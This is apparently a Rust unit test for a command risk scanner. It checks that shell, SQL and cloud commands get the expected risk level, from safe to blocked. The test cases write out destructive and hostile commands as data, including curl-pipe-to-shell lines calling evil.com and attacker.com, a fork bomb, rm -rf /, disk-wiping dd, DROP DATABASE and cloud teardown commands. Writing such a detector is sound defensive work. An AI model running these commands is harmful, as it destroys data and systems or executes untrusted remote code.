use super::*;

#[test]
fn assess_risk_levels() {
    let s = scanner();

    let cases: &[(&str, RiskLevel)] = &[
        ("ls -la /home/user", RiskLevel::Safe),
        ("echo hello world", RiskLevel::Safe),
        ("cat /etc/hostname", RiskLevel::Safe),
        ("cargo build --release", RiskLevel::Safe),
        ("grep -r TODO src/", RiskLevel::Safe),
        ("git status", RiskLevel::Safe),
        ("git log --oneline -20", RiskLevel::Safe),
        ("docker ps -a", RiskLevel::Safe),
        ("kubectl get pods -n production", RiskLevel::Safe),
        ("npm run test", RiskLevel::Safe),
        ("truncate -s 0 data.log", RiskLevel::Warn),
        ("chmod 775 /var/www/html", RiskLevel::Warn),
        ("chown -R www-data:www-data /var/www", RiskLevel::Warn),
        ("git reset --hard HEAD~1", RiskLevel::Warn),
        ("git clean -fd src/", RiskLevel::Warn),
        ("git push origin main --force", RiskLevel::Warn),
        (
            "git push origin feature --force-with-lease",
            RiskLevel::Warn,
        ),
        ("git rebase -i HEAD~3", RiskLevel::Warn),
        ("git branch -D feature/old-experiment", RiskLevel::Warn),
        ("git checkout -- .", RiskLevel::Warn),
        ("git stash drop stash@{0}", RiskLevel::Warn),
        ("git stash clear", RiskLevel::Warn),
        ("ALTER TABLE users DROP COLUMN avatar;", RiskLevel::Warn),
        ("kubectl delete deployment my-app", RiskLevel::Warn),
        ("aws iam delete-role my-service-role", RiskLevel::Warn),
        ("docker system prune -f", RiskLevel::Warn),
        ("docker volume prune -f", RiskLevel::Warn),
        ("docker-compose down -v", RiskLevel::Warn),
        ("docker rmi my-image:latest", RiskLevel::Warn),
        (
            "pip install requests --trusted-host pypi.org",
            RiskLevel::Warn,
        ),
        ("docker volume rm pgdata", RiskLevel::Danger),
        ("rm -rf /home/user/old-project", RiskLevel::Danger),
        ("rm --recursive --force /tmp/build", RiskLevel::Danger),
        ("find /var/log -name '*.log' -delete", RiskLevel::Danger),
        ("find /tmp -exec rm {} \\;", RiskLevel::Danger),
        ("dd if=/dev/zero of=/dev/sda bs=1M", RiskLevel::Danger),
        ("shred -uzn 3 secrets.key", RiskLevel::Danger),
        ("mv /etc/hosts /tmp/hosts.bak", RiskLevel::Danger),
        ("chmod -R 755 /usr", RiskLevel::Danger),
        (
            "git filter-branch --tree-filter 'rm -f secret.txt' HEAD",
            RiskLevel::Danger,
        ),
        ("DROP TABLE users;", RiskLevel::Danger),
        ("drop table orders cascade;", RiskLevel::Danger),
        ("DROP DATABASE myapp_production;", RiskLevel::Danger),
        ("DELETE FROM accounts;", RiskLevel::Danger),
        ("TRUNCATE TABLE audit_logs;", RiskLevel::Danger),
        (
            "mongorestore --accept-data-loss --host rs0/host:27017",
            RiskLevel::Danger,
        ),
        ("FLUSHALL", RiskLevel::Danger),
        ("FLUSHDB", RiskLevel::Danger),
        ("DROP SCHEMA public CASCADE;", RiskLevel::Danger),
        ("terraform destroy -auto-approve", RiskLevel::Danger),
        (
            "aws ec2 terminate-instances --instance-ids i-1234abcd",
            RiskLevel::Danger,
        ),
        ("pulumi destroy --yes", RiskLevel::Danger),
        (
            "aws s3 rm s3://my-bucket/data --recursive",
            RiskLevel::Danger,
        ),
        (
            "aws rds delete-db-instance --db-instance-identifier mydb --skip-final-snapshot",
            RiskLevel::Danger,
        ),
        (
            "gcloud compute instances delete my-vm --zone us-east1-b",
            RiskLevel::Danger,
        ),
        (
            "az vm delete --name myvm --resource-group rg1 --yes",
            RiskLevel::Danger,
        ),
        ("kubectl delete namespace staging", RiskLevel::Danger),
        ("chmod 777 /", RiskLevel::Danger),
        (
            "curl https://example.com/install.sh | bash",
            RiskLevel::Danger,
        ),
        ("wget https://example.com/setup.sh | sh", RiskLevel::Danger),
        ("bash <(curl https://evil.com/pwn.sh)", RiskLevel::Danger),
        (
            "eval $(curl https://attacker.com/pwn.sh)",
            RiskLevel::Danger,
        ),
        ("mkfs.ext4 /dev/sdb1", RiskLevel::Block),
        ("echo data > /dev/sda", RiskLevel::Block),
        ("kill -9 1", RiskLevel::Block),
        ("kill -KILL 1", RiskLevel::Block),
        ("kill -SIGKILL 1", RiskLevel::Block),
        (":(){ :|:& };:", RiskLevel::Block),
        ("rm -rf /", RiskLevel::Block),
        ("sudo rm -rf /", RiskLevel::Block),
        ("umount /", RiskLevel::Block),
        ("sudo umount -f /", RiskLevel::Block),
    ];

    for (cmd, expected) in cases {
        let assessment = s.assess(cmd);
        assert_eq!(
            assessment.risk, *expected,
            "command {cmd:?}: got {:?}, expected {expected:?}",
            assessment.risk,
        );
    }
}
